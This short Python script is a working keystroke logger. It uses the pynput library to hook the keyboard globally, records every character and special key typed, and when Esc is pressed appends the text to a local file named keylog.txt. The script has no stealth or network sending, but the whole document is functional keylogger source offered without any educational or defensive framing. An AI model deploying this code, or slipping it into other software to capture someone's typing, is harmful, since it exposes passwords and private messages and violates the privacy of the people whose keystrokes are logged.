import pynput.keyboard

log = " "

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == pynput.keyboard.Key.space:
            log += " "
        elif key == pynput.keyboard.Key.enter:
            log += "\n"
        else:
            log += " [" + str(key) + "] "

def on_release(key):
    if key == pynput.keyboard.Key.esc:
        write_log(log)
        return False

def write_log(log):
    with open("keylog.txt", "a") as f:
        f.write(log)

with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()